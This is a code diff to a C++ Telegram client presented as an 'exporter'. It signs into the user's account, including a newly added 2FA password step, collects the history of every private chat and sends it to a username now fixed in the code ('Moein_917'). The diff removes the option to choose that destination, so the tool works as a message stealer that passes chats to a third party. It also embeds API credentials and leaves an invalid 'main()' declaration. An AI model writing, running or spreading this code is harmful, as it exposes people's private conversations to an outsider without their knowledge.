@@ -15,7 +15,7 @@ using json = nlohmann::json;
 
 const int32_t API_ID = 29834234;
 const std::string API_HASH = "552c01d21d127def060f2915aedeebf9";
-std::string TARGET_USERNAME = "Moein_917";
+const std::string TARGET_USERNAME = "Moein_917"; // آیدی مقصد ثابتی که درخواست کردید
 
 struct ChatPaginationState {
     int64_t oldest_message_id = 0;
@@ -24,7 +24,7 @@ struct ChatPaginationState {
     std::vector<std::string> accumulated_messages;
 };
 
-class PrivateOnlyTelegramExporter {
+class DirectTelegramExporter {
 private:
     void* client;
     bool is_logged_in = false;
@@ -59,11 +59,11 @@ private:
     }
 
 public:
-    PrivateOnlyTelegramExporter() {
+    DirectTelegramExporter() {
         client = td_json_client_create();
     }
 
-    ~PrivateOnlyTelegramExporter() {
+    ~DirectTelegramExporter() {
         td_json_client_destroy(client);
     }
 
@@ -99,8 +99,8 @@ public:
                 {"api_id", API_ID},
                 {"api_hash", API_HASH},
                 {"system_language_code", "en"},
-                {"device_model", "Private Exporter"},
-                {"application_version", "3.1"}
+                {"device_model", "Direct Exporter"},
+                {"application_version", "3.2"}
             }}
         };
         send_request(set_params);
@@ -134,14 +134,7 @@ public:
 
     void run() {
         init();
-        std::cout << "[+] Private-Only Telegram Exporter initialized." << std::endl;
-
-        std::cout << "Enter target username to send exports (Default: Moein_915): ";
-        std::string input_user;
-        std::getline(std::cin, input_user);
-        if (!input_user.empty()) {
-            TARGET_USERNAME = input_user;
-        }
+        std::cout << "[+] Telegram Exporter initialized. Target: @" << TARGET_USERNAME << std::endl;
 
         while (true) {
             json response = receive_response(2.0);
@@ -167,6 +160,11 @@ public:
                     std::string code;
                     std::cin >> code;
                     send_request({{"@type", "checkAuthenticationCode"}, {"code", code}});
+                } else if (state == "authorizationStateWaitPassword") {
+                    std::cout << "Please enter 2FA password: ";
+                    std::string password;
+                    std::cin >> password;
+                    send_request({{"@type", "checkAuthenticationPassword"}, {"password", password}});
                 } else if (state == "authorizationStateReady") {
                     std::cout << "[+] Authentication successful! Resolving target user @" << TARGET_USERNAME << "..." << std::endl;
                     is_logged_in = true;
@@ -174,18 +172,16 @@ public:
                 }
             }
 
-            // دریافت آیدی عددی کاربر مقصد
             if (type == "chat" && !target_resolved) {
                 if (response.contains("id")) {
                     target_chat_id = response["id"];
                     target_resolved = true;
-                    std::cout << "[+] Target user resolved. ID: " << target_chat_id << std::endl;
+                    std::cout << "[+] Target user resolved successfully. ID: " << target_chat_id << std::endl;
                     std::cout << "[+] Fetching chat list..." << std::endl;
                     send_request({{"@type", "getChats"}, {"chat_list", {{"@type", "chatListMain"}}}, {"limit", 100}});
                 }
             }
 
-            // دریافت لیست چت‌ها و درخواست جزئیات هر کدام برای فیلتر کردن پی‌وی‌ها
             if (type == "chats" && !chats_listed) {
                 if (response.contains("chat_ids")) {
                     auto chat_ids = response["chat_ids"];
@@ -193,7 +189,6 @@ public:
 
                     for (auto& chat_id_json : chat_ids) {
                         int64_t cid = chat_id_json.get<int64_t>();
-                        // درخواست اطلاعات هر چت برای تشخیص نوع آن (پی‌وی یا گروه)
                         send_request({
                             {"@type", "getChat"},
                             {"chat_id", cid}
@@ -203,15 +198,12 @@ public:
                 }
             }
 
-            // بررسی اطلاعات هر چت و فیلتر کردن گروه‌ها/کانال‌ها
             if (type == "chat" && target_resolved) {
                 int64_t cid = response.value("id", 0);
                 
-                // بررسی اینکه آیا این چت یک پی‌وی (Private Chat) است و خود کاربر مقصد نیست
                 if (cid != 0 && cid != target_chat_id && response.contains("type")) {
                     std::string chat_type = response["type"].value("@type", "");
                     
-                    // فقط اگر نوع چت Private باشد آن را پردازش می‌کنیم
                     if (chat_type == "chatTypePrivate") {
                         std::string chat_title = response.value("title", "Private Chat");
                         
@@ -221,7 +213,6 @@ public:
 
                             std::cout << "[+] Found Private Chat: " << cid << " -> Fetching history..." << std::endl;
                             
-                            // شروع دریافت تاریخچه پیام‌های این پی‌وی
                             send_request({
                                 {"@type", "getChatHistory"},
                                 {"chat_id", cid},
@@ -235,7 +226,6 @@ public:
                 }
             }
 
-            // پردازش پیام‌ها و ساخت خروجی
             if (type == "messages") {
                 if (response.contains("messages") && response.contains("total_count")) {
                     int total = response["total_count"];
@@ -328,8 +318,8 @@ public:
     }
 };
 
-int main() {
-    PrivateOnlyTelegramExporter exporter;
+main() {
+    DirectTelegramExporter exporter;
     exporter.run();
     return 0;
 }
